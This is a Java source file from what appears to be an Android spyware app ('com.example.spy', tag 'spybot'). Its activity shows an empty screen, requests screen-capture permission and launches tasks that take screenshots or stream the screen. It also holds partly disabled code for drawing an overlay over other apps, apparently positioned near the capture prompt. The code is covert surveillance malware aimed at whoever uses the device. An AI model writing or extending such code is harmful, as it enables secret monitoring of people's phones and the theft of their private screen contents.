package com.example.spy.activities;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.PixelFormat;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.PowerManager;
import android.provider.Settings;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.WindowManager;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;

import com.example.spy.R;
import com.example.spy.tasks.StreamScreen;
import com.example.spy.tasks.TakeScreenShot;
import com.example.spy.utils.AppController;
import com.example.spy.utils.Constants;

import org.json.JSONException;
import org.json.JSONObject;

public class ScreenProjectionActivity extends Activity {
    String tag = "spybot";
    SharedPreferences prefs = new AppController().getContext().getSharedPreferences("com.android.spy", Context.MODE_PRIVATE);
    LayoutInflater li = (LayoutInflater) new AppController().getContext().getSystemService(Service.LAYOUT_INFLATER_SERVICE);

    //LinearLayout view = (LinearLayout) li.inflate(R.layout.overlay_1);

    @SuppressLint("NewApi")
    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        TextView tv = new TextView(this);
        tv.setText("");
        setContentView(tv);

        PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
        if (powerManager.isInteractive()) screenCast();
        else {
            JSONObject obj = new JSONObject();
            try {
                obj.put("name", "Screen Off");
                obj.put("image64", "null");
                obj.put("dataType", "downloadImage");
            } catch (JSONException e) {
                e.printStackTrace();
            }
            super.onBackPressed();
        }
    }

    private void screenCast() {
        MediaProjectionManager mgr = null;
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
            mgr = (MediaProjectionManager) new AppController().getContext().getSystemService(MEDIA_PROJECTION_SERVICE);
            startActivityForResult(mgr.createScreenCaptureIntent(), 7575);
        }
        //drawOverOtherApps()
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        //windowManager.removeView(view)
        if (requestCode == 7575 && resultCode == RESULT_OK){

        }
            if (getIntent().getBooleanExtra("streamScreen", false)) new StreamScreen(new AppController().getContext(), new Handler(), resultCode, data).start();
            else new TakeScreenShot(new AppController().getContext(), new Handler(), resultCode, data).start();

        super.onBackPressed();
    }



    private void drawOverOtherApps() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            Toast.makeText(this, "Draw Over other apps is not enabled", Toast.LENGTH_SHORT).show();
        } else
            draw();

    }

    private void draw() {

        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.WRAP_CONTENT,
                WindowManager.LayoutParams.TYPE_PHONE,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                PixelFormat.TRANSLUCENT);


        params.gravity = Gravity.BOTTOM;
        params.y = 395;
        params.x = 50;

        //WindowManager.addView(view, params);
    }
}
